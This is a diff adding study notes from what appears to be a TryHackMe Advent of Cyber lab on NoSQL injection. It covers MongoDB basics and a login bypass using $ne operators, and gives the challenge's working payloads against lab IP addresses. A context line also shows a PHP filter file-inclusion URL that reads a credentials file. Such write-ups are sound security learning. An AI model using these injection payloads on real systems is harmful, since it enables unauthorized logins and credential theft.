@@ -139,3 +139,83 @@ McSkidy is back, yeah!
 
    http://10.10.161.76/index.php?err=php://filter/convert.base64-encode/resource=includes/creds.php
    ```
+
+# Task 12 - Day 7 - Web Exploitation / Migration without security
+1. NoSQL
+   * a non relational database
+   * a data storing and retrieving system
+   * used for powerful features like fast queries, use of use to devs, and scaling
+2. Understanding NoSQL
+   * Examples: MongoDB, Couchbase, RavenDB
+   * constructs
+      * collections - similar to tables or views
+      * documents - similar to rows or records
+      * fields - similar to columns
+   * MongoDB objects stored in a format called BSON - binary JSON
+      * JSON - JavaScript Object Notation - interchange format that is easy for humans to read and write
+   * MongoDB comparison operators
+      * $and
+      * $or
+      * $eq
+   * MongoDB connection example
+      ```
+      ssh thm@ip -p 2222
+      mongo
+      show databases
+      use AoC3
+      db.createCollection("users")
+      db.createCollection("roles")
+      db.getCollectionNames()
+      db.users.insert({id:"1", username: "admin", email: "admin@thm.labs", password: "idk2021!"})
+      db.users.insert({id:"2", username: "user", email: "user@thm.labs", password: "password1!"})
+      db.users.find()
+      db.users.update({id:"2"}, {$set: {username: "tryhackme"}});
+      db.users.find()
+      db.users.remove({'id':'2'})
+      db.users.find()
+      db.users.drop()
+      ```
+   * MongoDB check for the flag
+      ```
+      show databases
+      use flagdb
+      show collections
+      db.flagColl.find()
+      ```
+3. NoSQL Injection
+   * allows an attacker to have control over the database
+   * send queries via untrusted and unfiltered application input
+
+4. Bypass login pages
+   * simple login process: connect to db and look for username/password, if exists proceed, else deny login
+   * operators common in injection
+      * $eq - matches records equal to a certain value
+      * $ne - matches records that are not equal to a certain value
+      * $gt - matches records that are greater than a certain value
+      * $where - matches records based on JavaScript condition
+      * $exists - matches records that have a certain field
+      * $regex - matches records that satisfy certain regular expressions
+   * operator injection example 1
+      ```
+      db.users.findOne({username: "admin", password: {"$ne":"xyz"}})
+      ```
+   * operator injection example 2
+      ```
+      db.users.findOne({username:{"$ne":"admin"},password:{"$ne":"xyz"}})
+      ```
+5. Exploting NoSQL injection
+   * find an entry point that doesn't sanitize input
+   * understand how requests are passed to the database: GET, POST, JSON, APIs
+   * url injection example
+      ```
+      http://example.thm.labs/search?username=admin&role[$ne]=user
+      ```
+6. Challenge
+   * Load the challenge web site in a browser.  Open Burp Suite and turn on intercept.  In the browser turn on FoxyProxy and attempt a login request.  For the first flag, login as the user admin and inject a not equals operator into the HTTP request password field.  After logging in with the admin user go to the gift search page.  Turn off FoxyProxy intercept for Burp.  Fiddle with the request URL to find all users that have a role of guest where you'll find the second flag.  Finally search gifts again for the user mcskidy to load only his record, there will be the last flag.
+   ```
+   username=admin&password[$ne]=test
+
+   http://10.10.177.223/search?username[$ne]=test&role=guest
+
+   http://10.10.177.223/search?username=mcskidy&role[$ne]=user
+   ```
